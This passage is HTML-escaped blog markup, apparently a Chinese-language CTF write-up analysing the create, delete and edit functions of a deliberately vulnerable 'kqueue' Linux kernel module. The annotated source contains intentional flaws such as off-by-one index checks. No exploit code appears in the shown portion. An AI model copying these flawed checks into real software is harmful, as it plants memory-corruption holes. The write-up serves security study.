class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;create_kqueue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; result = INVALID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(queueCount &amp;gt; MAX_QUEUES)												&lt;span class=&#34;comment&#34;&gt;//MAX_QUEUES= 5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Max queue count reached&amp;quot;&lt;/span&gt;);					&lt;span class=&#34;comment&#34;&gt;//限制创建的数目为5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* You can&amp;#x27;t ask for 0 queues , how meaningless */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.max_entries&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)								&lt;span class=&#34;comment&#34;&gt;//我们创建的队列至少有一个节点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] kqueue entries should be greater than 0&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Asking for too much is also not good */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.data_size&amp;gt;MAX_DATA_SIZE)						&lt;span class=&#34;comment&#34;&gt;//限制data的数据大小为0x20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] kqueue data size exceed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Initialize kqueue_entry structure */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry *kqueue_entry;								&lt;span class=&#34;comment&#34;&gt;//初始化节点指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check if multiplication of 2 64 bit integers results in overflow */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull space = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(__builtin_umulll_overflow(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(queue_entry),(request.max_entries+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),&amp;amp;space) == &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Integer overflow&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Gcc 的内部函数，space= sizeof(queue_entry) * (request.max_entries+1)；每一个entry可以理解为一个node&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Size is the size of queue structure + size of entry * request entries */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull queue_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(__builtin_saddll_overflow(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;),space,&amp;amp;queue_size) == &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Integer overflow&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Gcc 的内部函数，queue_size = sizeof(queue) + space&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Total size should not exceed a certain limit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(queue_size&amp;gt;&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;0x10000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Max kqueue alloc limit reached&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* All checks done , now call kzalloc */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; *&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; = validate((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kmalloc(queue_size,GFP_KERNEL));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//创建队列，queue_size = sizeof(queue_entry) * (request.max_entries+1) + sizeof(queue)；&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Main queue can also store data */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data = validate((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kmalloc(request.data_size,GFP_KERNEL));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Fill the remaining queue structure */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size   = request.data_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;max_entries = request.max_entries;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;queue_size  = queue_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Get to the place from where memory has to be handled */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kqueue_entry = (queue_entry *)((&lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt;)(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; + (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;span class=&#34;comment&#34;&gt;//(&amp;amp;queue+0x18)指向的是第一个节点的位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Allocate all kqueue entries */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry* current_entry = kqueue_entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry* prev_entry = current_entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;request.max_entries+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(i!=request.max_entries)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            prev_entry-&amp;gt;next = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        current_entry-&amp;gt;idx = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        current_entry-&amp;gt;data = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)(validate((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kmalloc(request.data_size,GFP_KERNEL)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/* Increment current_entry by size of queue_entry */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        current_entry += &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(queue_entry)/&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;;			&lt;span class=&#34;comment&#34;&gt;//（queue_entry *）current_entry +=1，指向下一个结构体，所有的节点在queue空间是线性的，所以这个queue的空间其实就是queue(队列头信息) + n*queue_entry,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/* Populate next pointer of the previous entry */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        prev_entry-&amp;gt;next = current_entry;					&lt;span class=&#34;comment&#34;&gt;//尾插法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        prev_entry = prev_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Find an appropriate slot in kqueues */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; j = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(j=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;j&amp;lt;MAX_QUEUES;j++)&amp;#123;							&lt;span class=&#34;comment&#34;&gt;//所有的队列形成一个数组kqueues,定义在头文件里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(kqueues[j] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//queue *kqueues[MAX_QUEUES] = &amp;#123;(queue *)NULL&amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(j&amp;gt;MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] No kqueue slot left&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Assign the newly created kqueue to the kqueues */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kqueues[j] = &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queueCount++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;整个创建新的 kqueue 的函数还是比较繁琐的，注释写道代码里&lt;/p&gt;
&lt;p&gt;大概就是，我们创建一个队列，整个队列包含所有的节点结构体，每个结构体的 data 指向一个新的堆块。然后把这个队列的头指针放入一个全局的数组。&lt;/p&gt;
&lt;h3 id=&#34;delete_kqueue&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#delete_kqueue&#34;&gt;#&lt;/a&gt; delete_kqueue&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete_kqueue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check for out of bounds requests */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.queue_idx&amp;gt;MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid idx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check for existence of the request kqueue */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; *&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; = kqueues[request.queue_idx];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Requested kqueue does not exist&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kfree(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;queue_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kqueues[request.queue_idx] = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里会根据我们传入结构体的 queue_idx, 释放对应的 queue, 并且数据清空，不存在 uaf。&lt;/p&gt;
&lt;h3 id=&#34;edit_kqueue&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#edit_kqueue&#34;&gt;#&lt;/a&gt; edit_kqueue&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit_kqueue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check the idx of the kqueue */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.queue_idx &amp;gt; MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid kqueue idx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check if the kqueue exists at that idx */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; *&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; = kqueues[request.queue_idx];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] kqueue does not exist&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check the idx of the kqueue entry */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.entry_idx &amp;gt; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;max_entries)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid kqueue entry_idx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//根据idx进行定位，定位到节点，每个节点不会保留data的大小，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Get to the kqueue entry memory */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry *kqueue_entry = (queue_entry *)(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; + (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//第一个头节点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//进行一个简单的遍历&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check for the existence of the kqueue entry */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exists = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;max_entries+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span 